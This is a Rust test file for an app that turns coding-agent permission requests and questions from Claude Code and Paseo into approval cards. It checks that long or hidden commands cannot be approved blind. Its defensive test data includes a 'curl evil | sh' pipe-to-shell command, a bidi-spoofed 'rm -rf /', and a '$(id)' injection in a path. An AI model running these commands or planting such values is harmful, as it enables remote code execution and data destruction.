use serde_json::json;
use services::hooks::{brief_due, install, item, remove, reply, state};

const EXE: &str = "/Applications/Sympony.app/Contents/MacOS/sympony";

#[test]
fn permission_becomes_a_card() {
    let p = json!({"hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "/Users/x/code/shop", "tool_name": "Bash",
                   "tool_input": {"command": "rm -rf build", "description": "Clean the build"}});
    let it = item("claude", "PermissionRequest", &p, true).unwrap();
    assert_eq!((it["agent"].as_str(), it["kind"].as_str(), it["project"].as_str(), it["tool"].as_str(), it["detail"].as_str(), it["answer"].as_bool()),
               (Some("Claude Code"), Some("permission"), Some("shop"), Some("Bash"), Some("rm -rf build"), Some(true)));
    // a file tool shows its path; with "answer from Sympony" off the card only tells
    let p = json!({"cwd": "/a/b", "tool_name": "Edit", "tool_input": {"file_path": "/a/b/src/main.rs"}});
    let it = item("claude", "PermissionRequest", &p, false).unwrap();
    assert_eq!((it["detail"].as_str(), it["answer"].as_bool()), (Some("src/main.rs"), Some(false)));
}

#[test]
fn question_and_done() {
    let p = json!({"cwd": "/x/app", "tool_name": "AskUserQuestion", "tool_input": {"questions": [
        {"question": "Which database?", "header": "DB", "multiSelect": false, "options": [{"label": "Postgres", "description": "Relational"}, {"label": "SQLite", "description": "File"}]}]}});
    let it = item("claude", "PreToolUse", &p, true).unwrap();
    assert_eq!(it["kind"], "question");
    assert_eq!(it["questions"], json!([{"q": "Which database?", "header": "DB", "o": [{"l": "Postgres", "d": "Relational"}, {"l": "SQLite", "d": "File"}], "m": false}]));
    // other tools' PreToolUse: not ours
    assert!(item("claude", "PreToolUse", &json!({"tool_name": "Bash"}), true).is_none());
    let it = item("claude", "Stop", &json!({"cwd": "/x/app", "last_assistant_message": "All tests pass."}), true).unwrap();
    assert_eq!((it["kind"].as_str(), it["text"].as_str(), it["answer"].as_bool()), (Some("done"), Some("All tests pass."), Some(false)));
    let long = "x".repeat(900);
    assert!(item("claude", "Stop", &json!({"last_assistant_message": long}), true).unwrap()["text"].as_str().unwrap().chars().count() <= 301);
}

#[test]
fn replies_claude_understands() {
    let allow = reply("PermissionRequest", &json!({}), "allow", None, None).unwrap();
    assert_eq!(serde_json::from_str::<serde_json::Value>(&allow).unwrap(), json!({"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": {"behavior": "allow"}}}));
    let deny: serde_json::Value = serde_json::from_str(&reply("PermissionRequest", &json!({}), "deny", None, None).unwrap()).unwrap();
    assert_eq!(deny["hookSpecificOutput"]["decision"]["behavior"], "deny");
    let input = json!({"questions": [{"question": "Which?", "header": "Pick", "options": [{"label": "A"}, {"label": "B"}], "multiSelect": true}]});
    let a: serde_json::Value = serde_json::from_str(&reply("PreToolUse", &json!({"tool_input": input}), "answer", Some(&json!([["A", "B"]])), None).unwrap()).unwrap();
    assert_eq!(a["hookSpecificOutput"]["permissionDecision"], "allow");
    assert_eq!(a["hookSpecificOutput"]["updatedInput"]["answers"], json!({"Which?": "A, B"}));
    assert_eq!(a["hookSpecificOutput"]["updatedInput"]["questions"], input["questions"]);
    // Claude Code hook questions accept typed text too (still keyed by question)
    let a_txt: serde_json::Value = serde_json::from_str(&reply("PreToolUse", &json!({"tool_input": input}), "answer", Some(&json!([["A"]])), Some(&json!(["Custom"]))).unwrap()).unwrap();
    assert_eq!(a_txt["hookSpecificOutput"]["updatedInput"]["answers"], json!({"Which?": "A, Custom"}));
    // skip denies with Dismissed by user
    let sk: serde_json::Value = serde_json::from_str(&reply("PreToolUse", &json!({"tool_input": input}), "skip", None, None).unwrap()).unwrap();
    assert_eq!(sk["hookSpecificOutput"]["permissionDecision"], "deny");
    assert_eq!(sk["hookSpecificOutput"]["permissionDecisionReason"], "Dismissed by user");
    // open / close / no click: nothing (the agent asks in its own window)
    assert!(reply("PermissionRequest", &json!({}), "open", None, None).is_none());
    assert!(reply("PermissionRequest", &json!({}), "", None, None).is_none());
}

#[test]
fn install_adds_only_ours_and_remove_takes_only_ours() {
    let theirs = json!({"model": "opus", "hooks": {"Stop": [{"hooks": [{"type": "command", "command": "say done"}]}]}});
    assert_eq!(state(&theirs, EXE), "none");
    let mine = install(&theirs, EXE);
    assert_eq!(mine["model"], "opus");
    assert_eq!(state(&mine, EXE), "installed");
    let stop = mine["hooks"]["Stop"].as_array().unwrap();
    assert_eq!(stop.len(), 2);
    assert!(stop[1]["hooks"][0]["command"].as_str().unwrap().contains("--hook claude Stop"));
    assert_eq!(mine["hooks"]["PreToolUse"][0]["matcher"], "AskUserQuestion");
    // installing twice doesn't double; another Sympony's path is "other"
    assert_eq!(install(&mine, EXE), mine);
    assert_eq!(state(&mine, "/Other/Sympony.app/Contents/MacOS/sympony"), "other");
    let back = remove(&mine);
    assert_eq!(back, theirs);
    let mut part = mine.clone();
    part["hooks"].as_object_mut().unwrap().remove("Notification");
    assert_eq!(state(&part, EXE), "partial");
}

#[test]
fn briefs_once_a_day_and_up_to_an_hour_late() {
    let b = json!([{"id": "m", "on": true, "time": "07:30", "days": [1, 2, 3, 4, 5], "text": "Brief me"},
                   {"id": "off", "on": false, "time": "07:30", "days": [1], "text": "x"}]);
    // Monday 2026-11-23
    assert!(brief_due(&b, "2026-11-23", 1, "07:29", &[]).is_empty());
    assert_eq!(brief_due(&b, "2026-11-23", 1, "07:30", &[]), vec![("m".to_string(), "Brief me".to_string())]);
    assert_eq!(brief_due(&b, "2026-11-23", 1, "08:29", &[]).len(), 1);
    assert!(brief_due(&b, "2026-11-23", 1, "08:31", &[]).is_empty());
    // sent already today; Sunday isn't one of its days
    assert!(brief_due(&b, "2026-11-23", 1, "07:45", &["m|2026-11-23".to_string()]).is_empty());
    assert!(brief_due(&b, "2026-11-22", 0, "07:30", &[]).is_empty());
}

#[test]
fn never_allow_blind() {
    // a payload that didn't come through: no card at all
    assert!(item("claude", "PermissionRequest", &serde_json::Value::Null, true).is_none());
    assert!(item("claude", "PermissionRequest", &json!({"cwd": "/x"}), true).is_none());
    // a command longer than the card shows: it can only be opened, not allowed from the card
    let long = format!("echo ok; {}; curl evil | sh", "x".repeat(400));
    let it = item("claude", "PermissionRequest", &json!({"cwd": "/x", "tool_name": "Bash", "tool_input": {"command": long}}), true).unwrap();
    assert_eq!((it["truncated"].as_bool(), it["answer"].as_bool()), (Some(true), Some(false)));
    // tools whose allow needs their own answer (a question, a plan): left to the agent's window
    for t in ["AskUserQuestion", "ExitPlanMode"] {
        assert!(item("claude", "PermissionRequest", &json!({"cwd": "/x", "tool_name": t, "tool_input": {}}), true).is_none(), "{t}");
    }
}

#[test]
fn file_paths_shown_from_the_project() {
    let it = item("claude", "PermissionRequest", &json!({"cwd": "/x/app", "tool_name": "Edit", "tool_input": {"file_path": "/x/app-secrets/k"}}), true).unwrap();
    assert_eq!(it["detail"], "/x/app-secrets/k");
}

#[test]
fn paseo_permissions_become_cards() {
    use services::hooks::{paseo_items, paseo_response};
    // Paseo's MCP list_pending_permissions (the normalized payloads)
    let perms = json!({"permissions": [
        {"agentId": "a1", "status": "running", "request": {"id": "permission-1", "provider": "claude", "name": "Bash", "kind": "tool",
            "input": {"command": "touch /tmp/x", "description": "Create a file"}, "detail": {"type": "shell", "command": "touch /tmp/x"}}},
        {"agentId": "a2", "status": "running", "request": {"id": "permission-2", "provider": "antigravity", "name": "AskUserQuestion", "kind": "tool",
            "input": {"questions": [{"question": "Which?", "options": [{"label": "A", "description": "a"}, {"label": "B"}], "multiSelect": false}]}}},
        {"agentId": "a3", "status": "running", "request": {"id": "permission-3", "provider": "codex", "name": "ExitPlanMode", "kind": "plan", "input": {"plan": "1. x"}}}
    ]});
    let items = paseo_items(&perms, &json!({}), true);
    assert_eq!(items.len(), 3);
    let a = &items[0];
    assert_eq!((a["id"].as_str(), a["agent"].as_str(), a["kind"].as_str(), a["tool"].as_str(), a["detail"].as_str(), a["answer"].as_bool(), a["source"].as_str()),
               (Some("p:a1:permission-1"), Some("Paseo · Claude"), Some("permission"), Some("Bash"), Some("touch /tmp/x"), Some(true), Some("paseo")));
    // a question is answered right here; a plan only in Paseo
    assert_eq!((items[1]["kind"].as_str(), items[1]["agent"].as_str(), items[1]["answer"].as_bool()), (Some("question"), Some("Paseo · Antigravity"), Some(true)));
    assert_eq!(items[1]["questions"], json!([{"q": "Which?", "o": [{"l": "A", "d": "a"}, {"l": "B", "d": ""}], "m": false}]));
    assert_eq!(items[2]["answer"], false);
    assert!(paseo_items(&perms, &json!({}), false).iter().all(|i| i["answer"] == false));
    // a command too long to show whole: open only
    let long = json!({"permissions": [{"agentId": "a", "request": {"id": "p", "provider": "claude", "name": "Bash", "input": {"command": "x".repeat(400)}}}]});
    assert_eq!(paseo_items(&long, &json!({}), true)[0]["answer"], false);
    // the answers Paseo takes
    let req = &perms["permissions"][1]["request"];
    assert_eq!(paseo_response(&perms["permissions"][0]["request"], "allow", None, None), Some(json!({"behavior": "allow"})));
    assert_eq!(paseo_response(req, "deny", None, None).unwrap()["behavior"], "deny");
    let r = paseo_response(req, "answer", Some(&json!([["B"]])), None).unwrap();
    assert_eq!((r["behavior"].as_str(), r["updatedInput"]["answers"].clone()), (Some("allow"), json!({"Which?": "B"})));
    assert!(paseo_response(req, "open", None, None).is_none());
}

#[test]
fn paseo_never_offers_a_blind_allow() {
    use services::hooks::{paseo_items, paseo_response};
    let perms = json!({"permissions": [
        // a Codex question: name request_user_input, kind question, keyed by header
        {"agentId": "c1", "request": {"id": "q1", "provider": "codex", "name": "request_user_input", "kind": "question",
            "input": {"questions": [{"header": "Lang", "question": "Which language?", "options": [{"label": "Rust"}, {"label": "Go"}]}]}}},
        // a Codex file change: no input, only detail.filePath
        {"agentId": "c2", "request": {"id": "f1", "provider": "codex", "name": "CodexFileChange", "kind": "tool", "detail": {"type": "file", "filePath": "src/main.rs"}}},
        // a tool with nothing to show
        {"agentId": "c3", "request": {"id": "t1", "provider": "codex", "name": "CodexMcpElicitation", "kind": "tool"}},
        // a plan / a mode change: open only
        {"agentId": "c4", "request": {"id": "p1", "provider": "codex", "name": "CodexPlanApproval", "kind": "plan", "input": {"plan": "x"}}},
        {"agentId": "c5", "request": {"id": "m1", "provider": "claude", "name": "SwitchMode", "kind": "mode", "input": {"mode": "auto"}}}
    ]});
    let it = paseo_items(&perms, &json!({}), true);
    assert_eq!((it[0]["kind"].as_str(), it[0]["answer"].as_bool()), (Some("question"), Some(true)));
    assert_eq!((it[1]["detail"].as_str(), it[1]["answer"].as_bool()), (Some("src/main.rs"), Some(true)));
    assert_eq!((it[2]["detail"].as_str(), it[2]["answer"].as_bool()), (Some(""), Some(false)));
    assert_eq!((it[3]["answer"].as_bool(), it[4]["answer"].as_bool()), (Some(false), Some(false)));
    // Codex reads the answer by the question's header
    let r = paseo_response(&perms["permissions"][0]["request"], "answer", Some(&json!([["Go"]])), None).unwrap();
    assert_eq!(r["updatedInput"]["answers"], json!({"Lang": "Go"}));
    // a provider name that isn't ASCII doesn't break it
    let odd = json!({"permissions": [{"agentId": "x", "request": {"id": "1", "provider": "écho", "name": "Bash", "kind": "tool", "input": {"command": "ls"}}}]});
    assert_eq!(paseo_items(&odd, &json!({}), true)[0]["agent"], "Paseo · Écho");
}

#[test]
fn paseo_cards_name_the_agents_project() {
    use services::hooks::paseo_items;
    // Paseo's list_agents: each agent's folder
    let agents = json!({"agents": [{"id": "a1", "cwd": "/Users/me/Playground/Sympony"}]});
    let perms = json!({"permissions": [
        {"agentId": "a1", "request": {"id": "1", "provider": "claude", "name": "Edit", "kind": "tool", "input": {"file_path": "/Users/me/Playground/Sympony/app/x.rs"}}},
        {"agentId": "zz", "request": {"id": "2", "provider": "claude", "name": "Bash", "kind": "tool", "input": {"command": "ls"}}}
    ]});
    let it = paseo_items(&perms, &agents, true);
    assert_eq!((it[0]["project"].as_str(), it[0]["detail"].as_str()), (Some("Sympony"), Some("app/x.rs")));
    // an agent Paseo didn't list: no project
    assert_eq!(it[1]["project"], "");
}

#[test]
fn paseo_questions_keep_fields_and_format_typed_answers_and_skip() {
    use services::hooks::{paseo_items, paseo_response};

    // 1. questions() keeps header, allowOther (and isOther), allowEmpty, placeholder
    let perms = json!({"permissions": [{
        "agentId": "a1",
        "request": {
            "id": "q-all",
            "provider": "claude",
            "name": "AskUserQuestion",
            "kind": "question",
            "input": {"questions": [
                {"header": "Warna", "question": "Warna aksen?", "options": [{"label": "Biru", "description": "Tenang"}, {"label": "Hijau"}], "multiSelect": false, "allowOther": true},
                {"header": "Modul", "question": "Modul mana?", "options": [{"label": "Sistem"}, {"label": "Cuaca"}], "multiSelect": true, "isOther": true},
                {"header": "Catatan", "question": "Ada catatan?", "options": [], "allowEmpty": true, "placeholder": "Tulis jawabanmu…"}
            ]}
        }
    }]});
    let cards = paseo_items(&perms, &json!({}), true);
    assert_eq!(cards.len(), 1);
    let qs = cards[0]["questions"].as_array().unwrap();
    assert_eq!(qs[0]["header"], "Warna");
    assert_eq!(qs[0]["allowOther"], true);
    assert_eq!(qs[1]["header"], "Modul");
    assert_eq!(qs[1]["allowOther"], true); // mapped from isOther
    assert_eq!(qs[1]["m"], true);
    assert_eq!(qs[2]["header"], "Catatan");
    assert_eq!(qs[2]["allowEmpty"], true);
    assert_eq!(qs[2]["placeholder"], "Tulis jawabanmu…");
    assert_eq!(qs[2]["o"], json!([]));

    let req = &perms["permissions"][0]["request"];

    // 2. Single with typed text (overrides label), multi with picks + text, no-option allowEmpty left blank -> ""
    let r = paseo_response(
        req,
        "answer",
        Some(&json!([["Biru"], ["Sistem", "Cuaca"], []])),
        Some(&json!(["  Merah marun  ", "Sholat", "   "])),
    ).unwrap();
    assert_eq!(r["behavior"], "allow");
    assert_eq!(r["updatedInput"]["answers"], json!({
        "Warna": "Merah marun",
        "Modul": "Sistem, Cuaca, Sholat",
        "Catatan": ""
    }));
    // Original input fields are preserved in updatedInput
    assert_eq!(r["updatedInput"]["questions"], req["input"]["questions"]);

    // 3. Single without typed text uses label; no-option with typed text uses text
    let r2 = paseo_response(
        req,
        "answer",
        Some(&json!([["Hijau"], [], []])),
        Some(&json!(["", "Lainnya", "Jangan ubah General"])),
    ).unwrap();
    assert_eq!(r2["updatedInput"]["answers"], json!({
        "Warna": "Hijau",
        "Modul": "Lainnya",
        "Catatan": "Jangan ubah General"
    }));

    // 4. Skip on mixed/options question -> deny "Dismissed by user"
    let skip_deny = paseo_response(req, "skip", None, None).unwrap();
    assert_eq!(skip_deny, json!({"behavior": "deny", "message": "Dismissed by user"}));

    // 5. Skip when every question has allowEmpty and no options -> allow with empty answers
    let opt_only_req = json!({
        "id": "q-empty",
        "provider": "claude",
        "name": "AskUserQuestion",
        "kind": "question",
        "input": {"questions": [
            {"header": "Catatan", "question": "Ada catatan?", "options": [], "allowEmpty": true},
            {"header": "Lain", "question": "Tambahan?", "options": [], "allowEmpty": true}
        ]}
    });
    let skip_allow = paseo_response(&opt_only_req, "skip", None, None).unwrap();
    assert_eq!(skip_allow["behavior"], "allow");
    assert_eq!(skip_allow["updatedInput"]["answers"], json!({"Catatan": "", "Lain": ""}));

    // 6. No-option question WITHOUT allowEmpty -> skip denies
    let req_required_text = json!({
        "id": "q-req",
        "provider": "claude",
        "name": "AskUserQuestion",
        "kind": "question",
        "input": {"questions": [
            {"header": "Nama", "question": "Nama proyek?", "options": []}
        ]}
    });
    assert_eq!(
        paseo_response(&req_required_text, "skip", None, None).unwrap(),
        json!({"behavior": "deny", "message": "Dismissed by user"})
    );
}

#[test]
fn m05_permission_cards_never_blind_allow_and_quote_hook_command() {
    // Empty tool_input must never allow direct approval on the card
    let empty = item("claude", "PermissionRequest", &json!({"cwd": "/x", "tool_name": "mcp__weird", "tool_input": {}}), true).unwrap();
    assert_eq!((empty["detail"].as_str(), empty["answer"].as_bool()), (Some(""), Some(false)));

    // Custom/MCP tool_input without standard keys renders serialized JSON so user sees what they approve
    let custom = item("claude", "PermissionRequest", &json!({"cwd": "/x", "tool_name": "mcp__gh__delete", "tool_input": {"repo": "org/a", "force": true}}), true).unwrap();
    assert!(custom["detail"].as_str().unwrap().contains("org/a"));
    assert_eq!(custom["answer"], true);

    // Oversized custom tool_input is truncated and cannot be approved from the card
    let big = item("claude", "PermissionRequest", &json!({"cwd": "/x", "tool_name": "mcp__x", "tool_input": {"payload": "a".repeat(400)}}), true).unwrap();
    assert_eq!((big["truncated"].as_bool(), big["answer"].as_bool()), (Some(true), Some(false)));

    // Bidi/control spoofing characters are stripped from detail
    let bidi = item("claude", "PermissionRequest", &json!({"cwd": "/x", "tool_name": "Bash", "tool_input": {"command": "echo\u{202E}ok\nrm -rf /"}}), true).unwrap();
    assert!(!bidi["detail"].as_str().unwrap().contains('\u{202E}'));
    assert!(!bidi["detail"].as_str().unwrap().contains('\n'));

    // Single-quoted executable prevents shell variable/subshell expansion
    let installed = install(&json!({}), "/Users/a$(id)'b/Sympony.app/Contents/MacOS/sympony");
    let cmd = installed["hooks"]["Stop"][0]["hooks"][0]["command"].as_str().unwrap();
    assert!(cmd.starts_with("'/Users/a$(id)'\\''b/Sympony.app/Contents/MacOS/sympony' --hook claude Stop"), "{cmd}");
}
